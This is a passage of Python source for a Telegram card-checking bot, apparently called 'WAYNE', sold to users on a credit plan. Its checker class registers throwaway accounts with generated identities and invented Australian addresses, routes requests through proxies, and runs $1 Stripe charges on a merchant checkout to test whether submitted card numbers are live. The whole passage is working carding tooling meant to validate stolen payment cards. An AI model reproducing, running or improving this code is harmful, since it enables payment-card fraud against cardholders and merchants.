                            'status': 'DECLINED',
                            'message': clean_error
                        }

                # If we get here, the response format is unexpected
                logger.warning(f"Unexpected JSON response format: {result}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': 'Unexpected response format'
                }

            except json.JSONDecodeError as json_error:
                logger.error(f"JSON parse error: {json_error}")

                # Try to extract error from HTML response
                decline_message = self.extract_error_from_html(response_text)
                if decline_message and decline_message != "Payment declined":
                    logger.warning(f"Extracted error from HTML: {decline_message}")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': decline_message
                    }
                else:
                    logger.warning("Could not extract error message from response")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Payment declined'
                    }

        except Exception as e:
            logger.error(f"Checkout processing error: {str(e)}")
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)[:100]}"
            }

    # MODIFIED: check_card with good proxy support
    async def check_card(self, card_details, username, user_data):
        """Main card checking method - OPTIMIZED"""
        start_time = time.time()
        logger.info(f"🔍 Starting Stripe Charge 1$ check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Get random Australian address
            address_info = random.choice(self.au_addresses)

            # Generate random email
            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            email = f"{random_string}@gmail.com"

            user_info = {
                'first_name': address_info['first_name'],
                'last_name': address_info['last_name'],
                'email': email,
                'address': address_info['address'],
                'city': address_info['city'],
                'postcode': address_info['postcode'],
                'phone': address_info['phone'],
                'state': address_info['state'],
                'country': address_info['country']
            }

            logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")

            # MODIFIED: Create HTTP client with good proxy support only
            client_params = {
                'timeout': 30.0,
                'follow_redirects': True,
                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
                'http2': True
            }
            
            # Add good proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                logger.info(f"🔄 Using good proxy: {self.current_proxy[:50]}...")
            else:
                logger.info("ℹ️ No good proxy available, proceeding with direct connection")

            async with httpx.AsyncClient(**client_params) as client:

                # Step 1: Initialize session
                if not await self.initialize_session(client):
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)

                # Step 2: Register account
                reg_success, email_used, reg_error = await self.register_account(client)
                if not reg_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", reg_error, username, time.time()-start_time, user_data, bin_info)

                user_info['email'] = email_used

                # Step 3: Add product to cart
                add_success, error = await self.add_product_to_cart(client)
                if not add_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)

                # Step 4: Get checkout tokens
                tokens, token_error = await self.get_checkout_tokens(client)
                if not tokens:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", token_error, username, time.time()-start_time, user_data, bin_info)

                # Step 5: Create Stripe payment method
                payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
                if not payment_result['success']:
                    error_msg = payment_result['error']
                    logger.warning(f"Payment method creation failed: {error_msg}")
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)

                # Step 6: Process checkout
                result = await self.process_checkout(client, tokens, payment_result['payment_method_id'], user_info)

                elapsed_time = time.time() - start_time
                logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")

                return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)

# Command handler - CORRECTED WITH UNIVERSAL CHARGE PROCESSOR
@Client.on_message(filters.command(["xo", ".xo", "$xo"]))
@auth_and_free_restricted
async def handle_stripe_charge_1(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "xo")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "xo", 
                    "Stripe Charge 1$",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE 1$]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xo</code> or <code>.xo</code> or <code>$xo</code>
⟐ <b>Usage</b>: <code>/xo cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xo 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges 1$ via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Stripe Charge 1$", "xo"
            ) if charge_processor else f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 1$
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # MODIFIED: Create checker instance with user_id and good proxy support
        checker = StripeCharge1Checker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="xo",          # keyword
                gateway_name="Stripe Charge 1$"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
